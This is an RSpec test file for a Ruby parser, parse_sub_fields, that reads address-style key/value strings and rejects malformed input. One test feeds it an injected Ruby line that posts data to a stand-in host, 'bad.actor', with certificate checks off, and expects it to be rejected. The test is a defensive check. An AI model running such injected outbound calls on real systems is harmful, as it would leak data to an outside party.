# frozen_string_literal: true

require 'rspec'

RSpec.describe SaplingApiService::ManageUserValidations do

  describe('#parse_sub_fields') do
    context('when input is valid') do
      context('when keys are unquoted') do
        it('should accept unquoted values') do
          input = '{ line_1: 123 The Street, city: London }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end

        it('should accept quoted values') do
          input = '{ line_1: "123 The Street", city: "London" }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end

        it('should handle omitted space between key and unquoted value') do
          input = '{ line_1:123 The Street, city:London }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end

        it('should handle omitted space between key and quoted value') do
          input = '{ line_1:"123 The Street", city:"London" }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end
      end

      context('when keys are quoted') do
        it('should accept unquoted values') do
          input = '{ "line_1": 123 The Street, "city": London }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end

        it('should accept quoted values') do
          input = '{ "line_1": "123 The Street", "city": "London" }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end

        it('should handle omitted space between key and unquoted value') do
          input = '{ "line_1":123 The Street, "city":London }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end

        it('should handle omitted space between key and quoted value') do
          input = '{ "line_1":"123 The Street", "city":"London" }'
          result = described_class.new(nil).send(:parse_sub_fields, input)
          expect(result).to eql({ 'line_1' => '123 The Street', 'city' => 'London' })
        end
      end
    end

    context('when input is invalid') do
      it('should raise error with nil input') do
        input = nil
        expect { described_class.new(nil).send(:parse_sub_fields, input) }.to raise_error(ArgumentError)
      end

      it('should raise error with empty string') do
        input = ''
        expect { described_class.new(nil).send(:parse_sub_fields, input) }.to raise_error(StandardError)
      end

      it('should raise error with a flat list') do
        input = 'line_1: 123 The Street, city: London'
        expect { described_class.new(nil).send(:parse_sub_fields, input) }.to raise_error(Psych::SyntaxError)
      end

      it('should raise error when input represents array') do
        input = '[a, b, c]'
        expect { described_class.new(nil).send(:parse_sub_fields, input) }.to raise_error(StandardError)
      end

      it('should raise error when input contains Ruby code') do
        input = 'HTTParty.post("https://bad.actor/oh_no", {body: "hello", verify: false})'
        expect { described_class.new(nil).send(:parse_sub_fields, input) }.to raise_error(StandardError)
      end
    end
  end
end
